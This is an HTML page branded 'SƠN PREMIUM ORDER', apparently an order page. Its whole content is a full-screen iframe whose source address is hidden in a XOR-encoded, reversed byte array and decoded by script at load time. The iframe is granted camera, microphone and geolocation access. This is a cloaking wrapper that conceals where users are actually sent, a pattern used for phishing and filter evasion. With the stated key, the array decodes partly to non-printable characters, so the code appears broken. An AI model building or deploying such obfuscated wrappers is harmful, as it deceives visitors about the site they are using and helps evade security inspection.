
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#f5f5f5">
    <meta name="description" content="SƠN PREMIUM ORDER">
    <title>SƠN PREMIUM ORDER</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            height: 100dvh;
            overflow: hidden;
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont,
                "Segoe UI", Roboto, sans-serif;
        }

        body {
            position: fixed;
            inset: 0;
        }

        #app-frame {
            display: block;
            width: 100%;
            height: 100%;
            height: 100dvh;
            border: none;
            background: #f5f5f5;
        }

        @supports not (height: 100dvh) {
            #app-frame {
                height: 100vh;
            }
        }

        @media (hover: none) and (pointer: coarse) {
            input,
            textarea,
            select,
            button {
                font-size: 16px;
            }
        }
    </style>
</head>

<body>

    <iframe
        id="app-frame"
        title="SƠN PREMIUM ORDER"
        allow="camera; microphone; geolocation"
        referrerpolicy="strict-origin-when-cross-origin">
    </iframe>

    <script>
    (function () {

        // URL được mã hóa XOR và đảo ngược
        const _key = 37;

        const _data = [
            90, 66, 75, 66, 94, 72, 91, 67, 91, 80,
            82, 73, 91, 67, 66, 90, 94, 67, 66, 91,
            74, 75, 80, 91, 80, 87, 87, 72, 73, 91,
            72, 73, 81, 82, 72, 80, 66, 91, 66, 90,
            74, 91, 88, 73, 72, 82, 66, 91, 73, 73,
            91, 82, 90, 67, 75, 82, 90, 82, 87, 90,
            80, 87, 87, 74, 90, 75, 72, 87, 90, 91,
            75, 72, 66, 75, 87, 73, 67, 90, 80, 75,
            87, 80, 88, 82, 73, 90, 82, 75, 80, 80,
            73, 90, 82, 66, 73, 91, 66, 80, 80, 90,
            73, 87, 80, 90, 80, 90, 75, 75, 75, 73,
            82, 80, 73, 66
        ];

        // Giải mã URL
        const _url = _data
            .map(function (code) {
                return String.fromCharCode(code ^ _key);
            })
            .reverse()
            .join("");

        // Tải website
        const _frame = document.getElementById("app-frame");

        if (_frame) {
            _frame.src = _url;
        }

    })();
    </script>

</body>
</html>
